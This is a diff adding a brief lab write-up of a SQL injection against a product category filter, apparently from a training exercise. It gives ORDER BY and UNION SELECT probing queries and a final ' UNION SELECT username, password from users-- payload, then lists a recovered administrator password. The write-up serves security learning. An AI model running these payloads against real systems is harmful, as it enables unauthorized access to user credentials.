@@ -1,0 +1,23 @@
+SQL Injection - Product Category Filter
+
+End Goal : Output the usernames and passwords in the users table and login as the administrator user.
+
+Analysis:
+1) Determine # of columns that the vulnerable query is missing
+' order by #-- where # changes iteratively
+Burpsuite Check : 2 columns are found
+
+2) Determine the data type of the columns
+Based on the no of columns found, the query may be as below
+select a, b from products where category='Gifts'
+
+SQLi Query : select a, b from products where category='Gifts' UNION select 'a', NULL --
+We do this iteratively till we find columns of datatype string
+Here, 1st column was string and 2nd was as well.
+select a, b from products where category='Gifts' UNION select 'a', 'a' --
+
+' UNION SELECT username, password from users--
+
+3) Retrieve password of administrator and login
+password : 206yg3qb6bk4ink0v6bu
+
